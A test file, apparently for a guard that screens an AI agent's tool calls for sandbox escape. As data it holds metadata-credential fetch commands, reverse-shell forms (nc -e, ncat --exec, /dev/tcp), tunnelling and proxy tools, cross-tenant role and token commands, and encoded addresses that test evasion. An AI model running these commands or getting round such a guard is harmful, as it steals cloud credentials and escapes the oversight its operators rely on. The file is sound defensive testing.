import { afterEach, describe, expect, test } from "bun:test";
import {
  CONTAINMENT_ESCAPE_EXPECTED_KEY,
  loadContainmentExpected,
  parseExpectedEnvironment,
  screenCall,
} from "../../src/containment/escape";

function restoreEnv(key: string, original: string | undefined): void {
  if (original === undefined) delete process.env[key];
  else process.env[key] = original;
}

function pass(subject: string, input: unknown, expected = false): void {
  expect(screenCall(subject, input, expected)).toEqual({ outcome: "pass" });
}

function blockEscape(
  subject: string,
  input: unknown,
  klass: "imds" | "egress-evasion" | "cross-tenant",
  label: string,
  expected = false,
): void {
  expect(screenCall(subject, input, expected)).toEqual({
    outcome: "block",
    reason: { kind: "escape", class: klass, label },
  });
}

function blockUnparseable(subject: string, input: unknown, expected = false): void {
  const result = screenCall(subject, input, expected);
  expect(result.outcome).toBe("block");
  if (result.outcome === "block") expect(result.reason.kind).toBe("unparseable");
}

describe("parseExpectedEnvironment", () => {
  test("only the exact string true is expected", () => {
    expect(parseExpectedEnvironment(undefined)).toBe(false);
    expect(parseExpectedEnvironment("false")).toBe(false);
    expect(parseExpectedEnvironment("TRUE")).toBe(false);
    expect(parseExpectedEnvironment("1")).toBe(false);
    expect(parseExpectedEnvironment("yes")).toBe(false);
    expect(parseExpectedEnvironment(" true")).toBe(false);
    expect(parseExpectedEnvironment("true")).toBe(true);
  });
});

describe("loadContainmentExpected", () => {
  const original = process.env[CONTAINMENT_ESCAPE_EXPECTED_KEY];

  afterEach(() => {
    restoreEnv(CONTAINMENT_ESCAPE_EXPECTED_KEY, original);
  });

  test("unset env and empty config is false", () => {
    delete process.env[CONTAINMENT_ESCAPE_EXPECTED_KEY];
    expect(loadContainmentExpected({})).toBe(false);
  });

  test("config true is expected when env is unset", () => {
    delete process.env[CONTAINMENT_ESCAPE_EXPECTED_KEY];
    expect(loadContainmentExpected({ [CONTAINMENT_ESCAPE_EXPECTED_KEY]: "true" })).toBe(true);
  });

  test("config TRUE is not expected", () => {
    delete process.env[CONTAINMENT_ESCAPE_EXPECTED_KEY];
    expect(loadContainmentExpected({ [CONTAINMENT_ESCAPE_EXPECTED_KEY]: "TRUE" })).toBe(false);
  });

  test("env true wins over a false config value", () => {
    process.env[CONTAINMENT_ESCAPE_EXPECTED_KEY] = "true";
    expect(loadContainmentExpected({ [CONTAINMENT_ESCAPE_EXPECTED_KEY]: "false" })).toBe(true);
  });

  test("env TRUE is not expected even if config says true", () => {
    process.env[CONTAINMENT_ESCAPE_EXPECTED_KEY] = "TRUE";
    expect(loadContainmentExpected({ [CONTAINMENT_ESCAPE_EXPECTED_KEY]: "true" })).toBe(false);
  });
});

describe("screenCall", () => {
  test("ordinary commands pass", () => {
    pass("bash", { command: "curl https://example.com" });
    pass("bash", { command: "curl http://example.com" });
    pass("bash", { command: "ls" });
    pass("bash", { command: "aws s3 ls" });
    pass("bash", { command: "cat main.tf # arn:aws:iam::123456789012:role/Other" });
    pass("bash", { command: "echo 169.254.169.254" });
    pass("powershell", { command: "Get-ChildItem" });
  });

  test("write_file is not inspectable even when the path names IMDS", () => {
    pass("write_file", { path: "http://169.254.169.254/latest/meta-data" });
  });

  test("non-inspectable subjects pass even with junk input", () => {
    pass("read_file", { path: "http://169.254.169.254/latest/meta-data" });
    pass("edit", { path: "/etc/hosts" });
    pass("grep", { pattern: "169.254.169.254" });
    pass("todo", { items: [] });
    pass("dispatch_subagents", { tasks: [] });
    pass("memory_write", { text: "curl http://169.254.169.254/" });
  });

  test("IMDS address and hostname rows need a fetch-ish neighbor", () => {
    blockEscape(
      "bash",
      { command: "curl http://169.254.169.254/latest/meta-data/" },
      "imds",
      "link-local cloud metadata IPv4 169.254.169.254",
    );
    blockEscape(
      "bash",
      { command: "curl http://169.254.170.2/v2/credentials" },
      "imds",
      "ECS task-credentials IPv4 169.254.170.2",
    );
    blockEscape(
      "bash",
      { command: "wget http://169.254.170.23/v1/credentials" },
      "imds",
      "EKS pod-identity IPv4 169.254.170.23",
    );
    blockEscape(
      "bash",
      { command: "curl http://100.100.100.200/latest/meta-data/" },
      "imds",
      "Alibaba metadata IPv4 100.100.100.200",
    );
    blockEscape(
      "bash",
      { command: "curl http://192.0.0.192/opc/v2/instance" },
      "imds",
      "OCI metadata IPv4 192.0.0.192",
    );
    blockEscape(
      "bash",
      { command: "curl http://[fd00:ec2::254]/latest/meta-data/" },
      "imds",
      "AWS IMDS IPv6 fd00:ec2::254",
    );
    blockEscape(
      "bash",
      { command: "curl http://metadata.google.internal/computeMetadata/v1/" },
      "imds",
      "GCP metadata hostname metadata.google.internal",
    );
    blockEscape(
      "bash",
      { command: "curl http://metadata.goog/computeMetadata/v1/" },
      "imds",
      "GCP metadata hostname metadata.goog",
    );
    pass("bash", { command: "echo 169.254.170.2" });
    pass("bash", { command: "echo metadata.google.internal" });
  });

  test("IMDS path and credential-env rows are substrings", () => {
    blockEscape("bash", { command: "echo /latest/meta-data" }, "imds", "EC2 IMDS meta-data path");
    blockEscape("bash", { command: "echo /latest/api/token" }, "imds", "EC2 IMDSv2 token path");
    blockEscape(
      "bash",
      { command: "echo /computeMetadata/v1" },
      "imds",
      "GCP computeMetadata/v1 path",
    );
    blockEscape(
      "bash",
      { command: "echo /metadata/identity/oauth2/token" },
      "imds",
      "Azure IMDS identity token path",
    );
    blockEscape("bash", { command: "echo /opc/v2" }, "imds", "OCI IMDS opc/v2 path");
    blockEscape(
      "bash",
      { command: "echo $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" },
      "imds",
      "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
    );
    blockEscape(
      "bash",
      { command: "echo $AWS_CONTAINER_CREDENTIALS_FULL_URI" },
      "imds",
      "AWS_CONTAINER_CREDENTIALS_FULL_URI",
    );
  });

  test("dropped IMDS hosts are not rows", () => {
    pass("bash", { command: "curl http://168.63.129.16/" });
    pass("bash", { command: "curl https://kubernetes.default.svc/" });
  });

  test("encoded IMDS still matches after normalize", () => {
    blockEscape(
      "bash",
      { command: "curl http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/" },
      "imds",
      "link-local cloud metadata IPv4 169.254.169.254",
    );
    blockEscape(
      "bash",
      { command: "curl http://\\x31\\x36\\x39.254.169.254/" },
      "imds",
      "link-local cloud metadata IPv4 169.254.169.254",
    );
  });

  test("egress evasion does not require a metadata target", () => {
    blockEscape("bash", { command: "ssh -D 1080" }, "egress-evasion", "ssh tunnel");
    blockEscape("bash", { command: "ssh -L 8080:localhost:80 host" }, "egress-evasion", "ssh tunnel");
    blockEscape("bash", { command: "ssh -R 80:localhost:80 host" }, "egress-evasion", "ssh tunnel");
    blockEscape("bash", { command: "ssh -W host:22 jump" }, "egress-evasion", "ssh tunnel");
    blockEscape(
      "bash",
      { command: "ssh -o ProxyCommand=nc host" },
      "egress-evasion",
      "ssh ProxyCommand",
    );
    blockEscape("bash", { command: "ngrok http 80" }, "egress-evasion", "ngrok");
    blockEscape(
      "bash",
      { command: "cloudflared tunnel run" },
      "egress-evasion",
      "cloudflared tunnel",
    );
    blockEscape("bash", { command: "chisel server" }, "egress-evasion", "chisel");
    blockEscape("bash", { command: "iodine -f tun" }, "egress-evasion", "iodine");
    blockEscape("bash", { command: "dnscat2 --dns" }, "egress-evasion", "dnscat");
    blockEscape("bash", { command: "proxychains curl https://example.com" }, "egress-evasion", "proxychains");
    blockEscape("bash", { command: "nc -e /bin/sh host 4444" }, "egress-evasion", "nc -e");
    blockEscape("bash", { command: "ncat --exec /bin/sh host 4444" }, "egress-evasion", "ncat --exec");
    blockEscape("bash", { command: "echo >/dev/tcp/1.2.3.4/80" }, "egress-evasion", "/dev/tcp/");
    blockEscape("bash", { command: "echo >/dev/udp/1.2.3.4/53" }, "egress-evasion", "/dev/udp/");
    blockEscape(
      "bash",
      { command: "curl -x socks5://127.0.0.1:1080 https://example.com" },
      "egress-evasion",
      "curl/wget proxy or resolve flag",
    );
    blockEscape(
      "bash",
      { command: "wget --proxy=on https://example.com" },
      "egress-evasion",
      "curl/wget proxy or resolve flag",
    );
    blockEscape(
      "bash",
      { command: "curl --socks5 127.0.0.1:1080 https://example.com" },
      "egress-evasion",
      "curl/wget proxy or resolve flag",
    );
    blockEscape(
      "bash",
      { command: "curl --connect-to example.com:443:127.0.0.1:443 https://example.com" },
      "egress-evasion",
      "curl/wget proxy or resolve flag",
    );
    blockEscape(
      "bash",
      { command: "curl --resolve example.com:443:1.2.3.4 https://example.com" },
      "egress-evasion",
      "curl/wget proxy or resolve flag",
    );
    blockEscape(
      "bash",
      { command: "curl --doh-url https://1.1.1.1/dns-query https://example.com" },
      "egress-evasion",
      "curl/wget proxy or resolve flag",
    );
    pass("bash", { command: "ssh user@host" });
    pass("bash", { command: "nc host 80" });
  });

  test("cross-tenant is an identity-exercise verb", () => {
    blockEscape(
      "bash",
      { command: "aws sts assume-role --role-arn arn:aws:iam::1:role/x" },
      "cross-tenant",
      "aws sts assume-role",
    );
    blockEscape(
      "bash",
      { command: "aws iam create-role --role-arn arn:aws:iam::1:role/x" },
      "cross-tenant",
      "--role-arn",
    );
    blockEscape(
      "bash",
      { command: "gcloud impersonate-service-account foo@bar.iam.gserviceaccount.com" },
      "cross-tenant",
      "gcloud impersonate-service-account",
    );
    blockEscape(
      "bash",
      { command: "az account get-access-token --tenant 00000000-0000-0000-0000-000000000000" },
      "cross-tenant",
      "az account get-access-token --tenant",
    );
    blockEscape("bash", { command: "kubectl create token default" }, "cross-tenant", "kubectl create token");
    blockEscape("bash", { command: "kubectl --as=system:serviceaccount:x:y get pods" }, "cross-tenant", "kubectl --as=");
  });

  test("unparseable inspectable input is a block", () => {
    blockUnparseable("bash", { command: 1 });
    blockUnparseable("bash", "ls");
    blockUnparseable("bash", null);
    blockUnparseable("powershell", { command: 1 });
    blockUnparseable("mcp", "not-an-object");
    const circular: { self?: unknown } = {};
    circular.self = circular;
    blockUnparseable("mcp_foo", { arguments: circular });
    blockUnparseable("bash", { command: "x".repeat(65537) });
    blockUnparseable("mcp", { arguments: { pad: "y".repeat(65537) } });
  });

  test("expected true passes table hits and still blocks unparseable", () => {
    pass("bash", { command: "curl http://169.254.169.254/latest/meta-data/" }, true);
    pass("bash", { command: "ssh -D 1080" }, true);
    pass("bash", { command: "aws sts assume-role" }, true);
    blockUnparseable("bash", { command: 1 }, true);
    blockUnparseable("powershell", { command: 1 }, true);
  });

  test("mcp and mcp_* stringify arguments", () => {
    blockEscape(
      "mcp",
      { arguments: { url: "http://169.254.169.254/latest/meta-data/" } },
      "imds",
      "link-local cloud metadata IPv4 169.254.169.254",
    );
    blockEscape(
      "mcp_github_fetch",
      { arguments: { command: "aws sts assume-role" } },
      "cross-tenant",
      "aws sts assume-role",
    );
    pass("mcp_github_fetch", { arguments: { url: "https://example.com" } });
  });
});
